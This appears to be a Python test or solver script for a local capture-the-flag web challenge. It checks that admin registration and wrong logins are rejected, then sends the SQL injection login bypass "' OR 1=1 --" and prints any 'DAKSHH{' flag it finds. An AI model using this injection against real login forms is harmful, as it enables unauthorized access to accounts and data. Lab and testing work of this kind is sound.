import requests

BASE_URL = "http://127.0.0.1:5001"

print("1. Initializing DB... (Auto-done by server on startup)")

print("\n2. Trying to register as 'admin' (Should fail/reject)...")
r = requests.post(f"{BASE_URL}/register", data={"user": "admin", "pass": "admin"})
print("Admin register rejected?", "You can't register with admin username" in r.text or "You can&#39;t register with admin username" in r.text)

print("\n3. Trying to login with wrong credentials...")
r = requests.post(f"{BASE_URL}/login", data={"user": "admin", "pass": "wrong"})
print("Wrong login rejected?", "Invalid Login" in r.text)

print("\n4. Trying SQL Injection (' OR 1=1 --)...")
r = requests.post(f"{BASE_URL}/login", data={"user": "admin", "pass": "' OR 1=1 --"})
if "DAKSHH{" in r.text:
    print("SUCCESS! Found flag in response:")
    for line in r.text.split('\n'):
        if "DAKSHH{" in line:
            print(line.strip())
else:
    print("FAILED! Flag not found.")
